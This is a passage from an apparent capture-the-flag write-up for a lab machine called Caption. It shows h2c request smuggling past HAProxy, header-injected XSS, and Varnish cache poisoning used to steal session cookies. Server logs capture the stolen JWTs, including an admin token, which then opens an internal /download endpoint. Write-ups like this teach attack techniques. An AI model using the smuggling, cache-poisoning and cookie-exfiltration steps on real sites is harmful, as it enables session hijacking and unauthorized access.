<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.

```

It’s returning a 302 redirect to `/`. That’s interesting. If I visit `http://caption.htb/logs` in my browser, it returns 403 immediately. That’s because HAProxy is blocking the request before it gets to Flask. When I bypass HAProxy using the tunneling exploit, the request reaches Flask where it returns the redirect to `/` for login. The smuggling worked.

#### Cookie Fail

I’ll try this again, adding the `-H` flag to include a valid cookie as margo:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODQwNDExfQ.MgG8n0yPn4iEpJvS7FICJUd
HtCuKgY1CQ165FuChRW0'                                                                                                 
[INFO] h2c stream established successfully.
...[snip]...
[INFO] Requesting - /logs
:status: 302
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 20:26:59 GMT
content-type: text/html; charset=utf-8
content-length: 219
location: /?err=role_error
x-varnish: 131113
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/?err=role_error">/?err=role_error</a>. If not, click the link.

```

Now it’s redirecting to `/?err=role_error`. That’s different. This response implies that I’ve bypassed HAProxy, and that Flask is now saying that margo doesn’t have access to this page.

### Admin Access

#### Host Injection POC

The next challenge is to figure out where the url `http://internal-proxy.local` comes from. It could be hardcoded into the HTML or JavaScript. Or it could be added by a proxy or cache via a header. To test this, I’ll try adding headers like `X-Forwarded-For` ([docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For)) and `X-Forwarded-Host` ([docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-Host)) to see if it impacts what gets set. `X-Forwarded-Host` works!

![image-20240919172315256](/img/image-20240919172315256.png)

What I set the header to is reflected in the HTML to load the `lib.js` library.

#### XSS POC

I have control over a parameter in that URL, but `lib.js` is returning 404 not found. That means I can’t see how the script would use the URL, as it doesn’t exist.

I’ll look at if I can inject HTML directly to create new tags. If I send the input is not sanitized, perhaps I can close the existing `script` tag and start a new one with the `src` as my host:

![image-20240919173601464](/img/image-20240919173601464.png)

It works! In fact, if I go to the “Render” tab, I’ll get hits on my Python webserver:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.6 - - [19/Sep/2024 17:33:50] code 404, message File not found
10.10.14.6 - - [19/Sep/2024 17:33:50] "GET /xss.js HTTP/1.1" 404 -
10.10.14.6 - - [19/Sep/2024 17:33:50] code 404, message File not found
10.10.14.6 - - [19/Sep/2024 17:33:50] "GET /xss.js HTTP/1.1" 404 -

```

#### Cache Analysis

For what I have so far to be useful, I need to get it into the browser of another user. I’ve only got two pages on the authenticated site, `/home` and `/firewall`. Visiting `/home` repeatedly, it doesn’t seem to be cached. The response headers show it as a `MISS`:

```

HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 10:00:17 GMT
content-type: text/html; charset=utf-8
content-length: 7106
x-varnish: 3113481
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

```

The `age` is always 0.

`/firewalls` on the other hand, sending repeatedly will increase the age:

```

HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 09:59:52 GMT
content-type: text/html; charset=utf-8
content-length: 7184
cache-control: public, max-age=120
x-varnish: 3113503 2294405
age: 119
via: 1.1 varnish (Varnish/6.6)
accept-ranges: bytes

```

The largest number I get is 123, and then it went back to 0, suggesting around a two minute cache period.

#### Cache Poison POC

To check if I can poison this page, I’ll wait until the cache should be clear, and send a request for `/firewalls` with an `X-Forwarded-Host` header:

![image-20240920060840987](/img/image-20240920060840987.png)

The response shows that it wasn’t served from cache. In the content of the page, `TESTING` is there:

![image-20240920060957216](/img/image-20240920060957216.png)

Now I’ll request the same page again without the `X-Forwarded-Host` header. The response headers show that this time it is served from cache:

```

HTTP/1.1 200 OK
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 10:07:22 GMT
content-type: text/html; charset=utf-8
content-length: 7145
cache-control: public, max-age=120
x-varnish: 164462 164460
age: 9
via: 1.1 varnish (Varnish/6.6)
accept-ranges: bytes

```

Looking down the page, TESTING is still there:

![image-20240920061109474](/img/image-20240920061109474.png)

This means that anyone who grabs the `/firewalls` page for that roughly two minute period will get the poisoned version.

#### Cookie Steal

Putting that all together, I’ll wait for the cache to clear and poison it again, this time with an XSS payload. I already showed that the cookie is not `HttpOnly`, so I’ll try a payload to capture that:

![image-20240920080648623](/img/image-20240920080648623.png)

It gets into the cache. If I load `/firewalls` in my browser, I get a hit from my host:

```
10.10.14.6 - - [20/Sep/2024 08:06:17] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODM3MjQ3fQ.HN6x0SVEaIe5kJHMK4KCuLdw3F3D5m7mhp8-hFbOWHQ HTTP/1.1" 200 -
10.10.14.6 - - [20/Sep/2024 08:06:17] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODM3MjQ3fQ.HN6x0SVEaIe5kJHMK4KCuLdw3F3D5m7mhp8-hFbOWHQ HTTP/1.1" 200 -
10.10.14.6 - - [20/Sep/2024 08:06:17] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzI2ODM3MjQ3fQ.HN6x0SVEaIe5kJHMK4KCuLdw3F3D5m7mhp8-hFbOWHQ HTTP/1.1" 200 -

```

A bit later, I get one from Caption:

```
10.10.11.33 - - [20/Sep/2024 08:06:38] "GET /?session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODM3NjE0fQ.TsubQKWownFLMgxudBa9zw0cUh-m1RLXRYyse1kPn8c HTTP/1.1" 200 -

```

I’ll add this to my browser, but it doesn’t allow access past HAProxy to `/logs` or `/download`.

### /logs and /download Enumeration

#### Smuggling Bypass

With this new admin cookie, I’ll smuggle again, and this time it works:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/logs -H 'Cookie: s
ession=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODM3NjE0fQ.TsubQKWownFLMgxudBa9zw0
cUh-m1RLXRYyse1kPn8c'                                                                                                 
[INFO] h2c stream established successfully.
...[snip]...
[INFO] Requesting - /logs
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 13:06:49 GMT
content-type: text/html; charset=utf-8
content-length: 4334
x-varnish: 2753218
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en" class="<html lang="pt-br" data-bs-theme="dark">

<head>
  <meta charset="UTF-8">

    <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>

  <title>Caption Networks Home</title>

    <link rel="canonical" href="https://codepen.io/ferrazjaa/pen/abPQywb">
  <script>
  window.console = window.console || function(t) {};
</script>

</head>

<body translate="no">
  <html lang="pt-br" data-bs-theme="dark">

<head>
   <title>Viajar é Preciso</title>
  <!-- LINKS BOOTSTRAP -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">

  <!-- ICONES -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
</head>

<body>

  <!-- nav bar -->
  <nav class="navbar navbar-expand-lg bg-body-tertiary p-4">
    <div class="container">
      <!-- o usuário escolher o modo dark ou light -->
      <button class="btn btn-secondary me-4" id="alterarTemaSite" onclick="alterarTemaSite()"><i
          class="bi bi-brightness-high-fill"></i>
      </button>

      <!-- Logo -->
      <a class="navbar-brand text-success" href="#"><strong>Caption Networks <i class="bi bi-globe"></i></strong></a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>

      <!-- MENU -->
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav me-auto mb-2 mb-lg-0">
          <li class="nav-item">
            <a class="nav-link active" aria-current="page" href="/home">Home</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/firewalls">Firewalls</a>
          </li>
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
              Routers
            </a>
            <ul class="dropdown-menu">
              <li><a class="dropdown-item" href="#">Staging Networks</a></li>
              <li><a class="dropdown-item" href="#">UAT Networks</a></li>
            </ul>
          <li><a class="nav-link" aria-current="page" href="/logs">Logs</a>
          </li>

        </ul>
        <div class="d-flex">
          <a href="/logout" class="btn btn-success">Logout</a>
        </div>
      </div>
    </div>
  </nav>

  <header class="container my-4">
    <div class="row">
      <!-- vai ocupar todo o espaço se a tela for pequena -->
      <!-- col-lg-6 para telas grandes -->

        <center><h1>Log Management</h1></center>
        <br/><br/><center>
        <ul>
            <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
        </ul></center>
      </div>
    </div>
  </header>

  <!-- BOOTSTRAP JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
    crossorigin="anonymous"></script>

</html>

      <script id="rendered-js" >
// altera tem site
function alterarTemaSite() {
  let tema = document.querySelector("html").getAttribute("data-bs-theme");
  if (tema === "dark") {
    document.querySelector("html").setAttribute("data-bs-theme", "light");
    document.querySelector("#alterarTemaSite").innerHTML = `<i class="bi bi-moon-fill"></i>`;
  } else {
    document.querySelector("html").setAttribute("data-bs-theme", "dark");
    document.querySelector("#alterarTemaSite").innerHTML = `<i class="bi bi-brightness-high-fill""></i>`;
  }

}
//# sourceURL=pen.js
    </script>

</body>

</html>

```

That’s a new page!

#### Identify Backend Server

The interesting part of `/logs` is:

```

        <center><h1>Log Management</h1></center>
        <br/><br/><center>
        <ul>
            <li><a href="/download?url=http://127.0.0.1:3923/ssh_logs">SSH Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/fw_logs">Firewall Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/zk_logs">Zookeeper Logs</a></li>
            <li><a href="/download?url=http://127.0.0.1:3923/hadoop_logs">Hadoop Logs</a></li>
        </ul></center>

```

There are three links to `/download`, with URLs on a internal port. I’ll fetch these over smuggling:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/ssh_logs -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODM3NjE0fQ.TsubQKWownFLMgxudBa9zw0cUh-m1RLXRYyse1kPn8c'
...[snip]...
[INFO] Requesting - /download?url=http://127.0.0.1:3923/ssh_logs
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 13:16:24 GMT
content-type: text/html; charset=utf-8
content-length: 15300
x-varnish: 3113579
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

Mar  6 07:20:08 ubuntu systemd-logind[814]: New seat seat0.
Mar  6 07:20:09 ubuntu sshd[1025]: Server listening on 0.0.0.0 port 22.
Mar  6 07:20:09 ubuntu sshd[1025]: Server listening on :: port 22.
Mar  6 07:20:42 ubuntu login[1016]: pam_unix(login:session): session opened for user root(uid=0) by LOGIN(uid=0)
Mar  6 07:20:42 ubuntu systemd-logind[814]: New session 1 of user root.
Mar  6 07:20:42 ubuntu systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
Mar  6 07:20:18 ubuntu sshd[1025]: Received signal 15; terminating.
Mar  6 07:20:18 ubuntu sshd[1265]: Server listening on 0.0.0.0 port 22.
Mar  6 07:20:18 ubuntu sshd[1265]: Server listening on :: port 22.
Mar  6 07:20:37 ubuntu sshd[1267]: Accepted password for root from 10.10.15.13 port 44796 ssh2
Mar  6 07:20:37 ubuntu sshd[1267]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 07:20:37 ubuntu systemd-logind[814]: New session 3 of user root.
Mar  6 07:21:25 ubuntu groupadd[2484]: new group: name=haproxy, GID=120
Mar  6 07:21:25 ubuntu chage[2497]: changed password expiry for haproxy
Mar  6 07:21:27 ubuntu groupadd[2600]: new group: name=varnish, GID=121
Mar  6 07:21:27 ubuntu usermod[2613]: change user 'varnish' password
Mar  6 07:21:27 ubuntu chage[2620]: changed password expiry for varnish
Mar  6 07:21:27 ubuntu usermod[2633]: change user 'vcache' password
Mar  6 07:21:27 ubuntu chage[2640]: changed password expiry for vcache
Mar  6 07:21:27 ubuntu usermod[2653]: change user 'varnishlog' password
Mar  6 07:21:27 ubuntu chage[2660]: changed password expiry for varnishlog
Mar  6 07:21:39 ubuntu sshd[1265]: Received signal 15; terminating.
Mar  6 07:21:40 ubuntu sshd[3223]: Server listening on 0.0.0.0 port 22.
Mar  6 07:21:40 ubuntu sshd[3223]: Server listening on :: port 22.
Mar  6 08:13:02 ubuntu groupadd[6091]: new group: name=margo, GID=1000
Mar  6 08:13:06 ubuntu passwd[6108]: pam_unix(passwd:chauthtok): password changed for margo
Mar  6 08:13:07 ubuntu chfn[6109]: changed user 'margo' information
Mar  6 08:14:05 ubuntu passwd[6119]: pam_unix(passwd:chauthtok): password changed for margo
Mar  6 08:14:21 ubuntu su: (to margo) root on pts/0
Mar  6 08:14:21 ubuntu su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 08:15:06 ubuntu sshd[6147]: Accepted password for margo from 10.10.15.13 port 40890 ssh2
Mar  6 08:15:06 ubuntu sshd[6147]: pam_unix(sshd:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 08:15:07 ubuntu systemd-logind[814]: New session 4 of user margo.
Mar  6 08:15:07 ubuntu systemd: pam_unix(systemd-user:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 08:15:14 ubuntu sshd[6211]: Received disconnect from 10.10.15.13 port 40890:11: disconnected by user
Mar  6 08:15:14 ubuntu sshd[6211]: Disconnected from user margo 10.10.15.13 port 40890
Mar  6 08:15:14 ubuntu sshd[6147]: pam_unix(sshd:session): session closed for user margo
Mar  6 08:15:14 ubuntu systemd-logind[814]: Session 4 logged out. Waiting for processes to exit.
Mar  6 08:15:14 ubuntu systemd-logind[814]: Removed session 4.
Mar  6 08:17:01 ubuntu CRON[6247]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 08:17:01 ubuntu CRON[6247]: pam_unix(cron:session): session closed for user root
Mar  6 08:22:16 ubuntu sshd[6272]: Accepted password for root from 10.10.15.13 port 54076 ssh2
Mar  6 08:22:16 ubuntu sshd[6272]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 08:22:16 ubuntu systemd-logind[814]: New session 7 of user root.
Mar  6 08:23:46 ubuntu sshd[6272]: Received disconnect from 10.10.15.13 port 54076:11: disconnected by user
Mar  6 08:23:46 ubuntu sshd[6272]: Disconnected from user root 10.10.15.13 port 54076
Mar  6 08:23:46 ubuntu sshd[6272]: pam_unix(sshd:session): session closed for user root
Mar  6 08:23:46 ubuntu systemd-logind[814]: Session 7 logged out. Waiting for processes to exit.
Mar  6 08:23:46 ubuntu systemd-logind[814]: Removed session 7.
Mar  6 08:24:04 ubuntu sshd[6898]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.10.15.13  user=root
Mar  6 08:24:06 ubuntu sshd[6898]: Failed password for root from 10.10.15.13 port 35094 ssh2
Mar  6 08:24:08 ubuntu sshd[6898]: Accepted password for root from 10.10.15.13 port 35094 ssh2
Mar  6 08:24:08 ubuntu sshd[6898]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 08:24:08 ubuntu systemd-logind[814]: New session 8 of user root.
Mar  6 08:24:22 ubuntu sshd[6898]: Received disconnect from 10.10.15.13 port 35094:11: disconnected by user
Mar  6 08:24:22 ubuntu sshd[6898]: Disconnected from user root 10.10.15.13 port 35094
Mar  6 08:24:22 ubuntu sshd[6898]: pam_unix(sshd:session): session closed for user root
Mar  6 08:24:22 ubuntu systemd-logind[814]: Session 8 logged out. Waiting for processes to exit.
Mar  6 08:24:22 ubuntu systemd-logind[814]: Removed session 8.
Mar  6 08:25:00 ubuntu sshd[7217]: Accepted password for root from 10.10.15.13 port 58112 ssh2
Mar  6 08:25:00 ubuntu sshd[7217]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 08:25:00 ubuntu systemd-logind[814]: New session 9 of user root.
Mar  6 08:27:49 ubuntu sshd[7217]: Received disconnect from 10.10.15.13 port 58112:11: disconnected by user
Mar  6 08:27:49 ubuntu sshd[7217]: Disconnected from user root 10.10.15.13 port 58112
Mar  6 08:27:49 ubuntu sshd[7217]: pam_unix(sshd:session): session closed for user root
Mar  6 08:27:49 ubuntu systemd-logind[814]: Session 9 logged out. Waiting for processes to exit.
Mar  6 08:27:49 ubuntu systemd-logind[814]: Removed session 9.
Mar  6 08:29:31 ubuntu sshd[8075]: Accepted password for root from 10.10.15.13 port 37836 ssh2
Mar  6 08:29:31 ubuntu sshd[8075]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 08:29:31 ubuntu systemd-logind[814]: New session 10 of user root.
Mar  6 08:29:37 ubuntu su: (to margo) root on pts/1
Mar  6 08:29:37 ubuntu su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 08:59:49 ubuntu su: pam_unix(su:session): session closed for user margo
Mar  6 08:59:51 ubuntu sshd[8075]: Exiting on signal 15
Mar  6 08:59:51 ubuntu sshd[8075]: pam_unix(sshd:session): session closed for user root
Mar  6 08:59:51 ubuntu sshd[1267]: Exiting on signal 15
Mar  6 08:59:51 ubuntu sshd[1267]: pam_unix(sshd:session): session closed for user root
Mar  6 08:59:51 ubuntu su: pam_unix(su:session): session closed for user margo
Mar  6 08:59:51 ubuntu sshd[3223]: Received signal 15; terminating.
Mar  6 08:59:51 ubuntu systemd-logind[814]: Session 1 logged out. Waiting for processes to exit.
Mar  6 08:59:51 ubuntu systemd-logind[814]: Session 10 logged out. Waiting for processes to exit.
Mar  6 09:01:16 caption systemd-logind[823]: New seat seat0.
Mar  6 09:01:17 caption CRON[976]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:01:17 caption CRON[977]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:01:17 caption sshd[991]: Server listening on 0.0.0.0 port 22.
Mar  6 09:01:17 caption sshd[991]: Server listening on :: port 22.
Mar  6 09:11:53 caption sshd[1408]: Accepted password for root from 10.10.15.13 port 54756 ssh2
Mar  6 09:11:53 caption sshd[1408]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 09:11:53 caption systemd-logind[823]: New session 3 of user root.
Mar  6 09:11:53 caption systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
Mar  6 09:13:40 caption su: (to margo) root on pts/0
Mar  6 09:13:40 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 09:13:57 caption su: pam_unix(su:session): session closed for user margo
Mar  6 09:15:23 caption su: (to margo) root on pts/0
Mar  6 09:15:23 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 09:15:56 caption su: pam_unix(su:session): session closed for user margo
Mar  6 09:16:59 caption sshd[1619]: Accepted publickey for margo from 10.10.15.13 port 35916 ssh2: ECDSA SHA256:ui/tjroDv1J8dgCcGNIaAr3QIk9BBLFDJVwiH9emcSQ
Mar  6 09:16:59 caption sshd[1619]: pam_unix(sshd:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:16:59 caption systemd-logind[823]: New session 5 of user margo.
Mar  6 09:16:59 caption systemd: pam_unix(systemd-user:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:17:01 caption CRON[1691]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 09:17:01 caption CRON[1691]: pam_unix(cron:session): session closed for user root
Mar  6 09:17:36 caption sshd[1408]: Received disconnect from 10.10.15.13 port 54756:11: disconnected by user
Mar  6 09:17:36 caption sshd[1408]: Disconnected from user root 10.10.15.13 port 54756
Mar  6 09:17:36 caption sshd[1408]: pam_unix(sshd:session): session closed for user root
Mar  6 09:17:36 caption systemd-logind[823]: Session 3 logged out. Waiting for processes to exit.
Mar  6 09:17:36 caption systemd-logind[823]: Removed session 3.
Mar  6 09:17:38 caption sshd[1682]: Received disconnect from 10.10.15.13 port 35916:11: disconnected by user
Mar  6 09:17:38 caption sshd[1682]: Disconnected from user margo 10.10.15.13 port 35916
Mar  6 09:17:38 caption sshd[1619]: pam_unix(sshd:session): session closed for user margo
Mar  6 09:17:38 caption systemd-logind[823]: Session 5 logged out. Waiting for processes to exit.
Mar  6 09:17:38 caption systemd-logind[823]: Removed session 5.
Mar  6 09:17:46 caption systemd: pam_unix(systemd-user:session): session closed for user root
Mar  6 09:35:20 caption sshd[1748]: Accepted password for root from 10.10.15.13 port 51694 ssh2
Mar  6 09:35:20 caption sshd[1748]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 09:35:20 caption systemd-logind[823]: New session 8 of user root.
Mar  6 09:35:20 caption systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
Mar  6 09:35:23 caption su: (to margo) root on pts/0
Mar  6 09:35:23 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 09:51:02 caption su: pam_unix(su:session): session closed for user margo
Mar  6 09:51:03 caption sshd[1748]: Exiting on signal 15
Mar  6 09:51:03 caption sshd[1748]: pam_unix(sshd:session): session closed for user root
Mar  6 09:51:03 caption sshd[991]: Received signal 15; terminating.
Mar  6 09:51:03 caption systemd-logind[823]: Session 8 logged out. Waiting for processes to exit.
Mar  6 09:53:57 caption systemd-logind[823]: New seat seat0.
Mar  6 09:53:57 caption systemd-logind[823]: Watching system buttons on /dev/input/event0 (Power Button)
Mar  6 09:53:57 caption systemd-logind[823]: Watching system buttons on /dev/input/event1 (AT Translated Set 2 keyboard)
Mar  6 09:53:58 caption CRON[968]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:53:58 caption CRON[969]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 09:53:58 caption sshd[986]: Server listening on 0.0.0.0 port 22.
Mar  6 09:53:58 caption sshd[986]: Server listening on :: port 22.
Mar  6 10:00:04 caption sshd[1401]: Accepted password for root from 10.10.15.13 port 34384 ssh2
Mar  6 10:00:04 caption sshd[1401]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:00:04 caption systemd-logind[823]: New session 3 of user root.
Mar  6 10:00:04 caption systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:00:38 caption sshd[1401]: Exiting on signal 15
Mar  6 10:00:38 caption sshd[1401]: pam_unix(sshd:session): session closed for user root
Mar  6 10:00:38 caption sshd[986]: Received signal 15; terminating.
Mar  6 10:00:38 caption systemd-logind[823]: Session 3 logged out. Waiting for processes to exit.
Mar  6 10:03:33 caption systemd-logind[822]: New seat seat0.
Mar  6 10:03:33 caption systemd-logind[822]: Watching system buttons on /dev/input/event0 (Power Button)
Mar  6 10:03:33 caption systemd-logind[822]: Watching system buttons on /dev/input/event1 (AT Translated Set 2 keyboard)
Mar  6 10:03:33 caption CRON[967]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 10:03:34 caption CRON[966]: pam_unix(cron:session): session opened for user margo(uid=1000) by (uid=0)
Mar  6 10:03:34 caption sshd[994]: Server listening on 0.0.0.0 port 22.
Mar  6 10:03:34 caption sshd[994]: Server listening on :: port 22.
Mar  6 10:07:18 caption sshd[1400]: Accepted password for root from 10.10.15.13 port 44930 ssh2
Mar  6 10:07:18 caption sshd[1400]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:07:18 caption systemd-logind[822]: New session 3 of user root.
Mar  6 10:07:18 caption systemd: pam_unix(systemd-user:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:17:01 caption CRON[1573]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:17:01 caption CRON[1573]: pam_unix(cron:session): session closed for user root
Mar  6 10:37:45 caption sshd[5443]: Accepted password for root from 10.10.15.13 port 48528 ssh2
Mar  6 10:37:45 caption sshd[5443]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 10:37:45 caption systemd-logind[822]: New session 6 of user root.
Mar  6 10:42:20 caption sshd[5443]: Received disconnect from 10.10.15.13 port 48528:11: disconnected by user
Mar  6 10:42:20 caption sshd[5443]: Disconnected from user root 10.10.15.13 port 48528
Mar  6 10:42:20 caption sshd[5443]: pam_unix(sshd:session): session closed for user root
Mar  6 10:42:20 caption systemd-logind[822]: Session 6 logged out. Waiting for processes to exit.
Mar  6 10:42:20 caption systemd-logind[822]: Removed session 6.
Mar  6 11:17:01 caption CRON[8508]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Mar  6 11:17:01 caption CRON[8508]: pam_unix(cron:session): session closed for user root
Mar  6 11:56:20 caption CRON[966]: pam_unix(cron:session): session closed for user margo
Mar  6 11:56:30 caption su: (to margo) root on pts/0
Mar  6 11:56:30 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 11:59:28 caption su: pam_unix(su:session): session closed for user margo
Mar  6 11:59:37 caption su: (to margo) root on pts/0
Mar  6 11:59:37 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 12:05:53 caption sshd[11670]: Accepted password for root from 10.10.15.13 port 35262 ssh2
Mar  6 12:05:53 caption sshd[11670]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 12:05:53 caption systemd-logind[822]: New session 8 of user root.
Mar  6 12:05:58 caption su: (to margo) root on pts/1
Mar  6 12:05:58 caption su: pam_unix(su:session): session opened for user margo(uid=1000) by root(uid=0)
Mar  6 12:09:47 caption su: pam_unix(su:session): session closed for user margo
Mar  6 12:13:55 caption su: pam_unix(su:session): session closed for user margo

```

It works. There is a slight hint in these logs. root has SSHed into the box and used `su` to run as margo. margo has connected with SSH as well:

```

Mar  6 09:16:59 caption sshd[1619]: Accepted publickey for margo from 10.10.15.13 port 35916 ssh2: ECDSA 

```

I’ll note the key algorithm here is ECDSA (as opposed to RSA as typically seen by default). There’s not too much interesting in the other two logs. I’ll check the root of this server, `http://caption.htb/download?url=http//127.0.0.1:3923/`:

```

oxdf@hacky$ python h2csmuggler.py -x http://caption.htb http://caption.htb/download?url=http://127.0.0.1:3923/ -H 'Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI2ODQxMTU1fQ.CS3ltv42Q7kPNS1e7Q66b5ox01cM0WzzFzXv45II1SQ'
[INFO] h2c stream established successfully.
:status: 200
...[snip]...
[INFO] Requesting - /download?url=http://127.0.0.1:3923/
:status: 200
server: Werkzeug/3.0.1 Python/3.10.12
date: Fri, 20 Sep 2024 13:20:47 GMT
content-type: text/html; charset=utf-8
content-length: 4400
x-varnish: 3113588
age: 0
via: 1.1 varnish (Varnish/6.6)
x-cache: MISS
accept-ranges: bytes

<!DOCTYPE html>
<html lang="en">

<head>
        <meta charset="utf-8">
        <title>💾🎉</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=0.8, minimum-scale=0.6">
        <meta name="theme-color" content="#333">

        <link rel="stylesheet" media="screen" href="/.cpr/ui.css?_=7WOr">
        <link rel="stylesheet" media="screen" href="/.cpr/browser.css?_=7WOr">
</head>

<body>
        <div id="ops"></div>

        <div id="op_search" class="opview">
                <div id="srch_form" class="opbox"></div>
                <div id="srch_q"></div>
        </div>

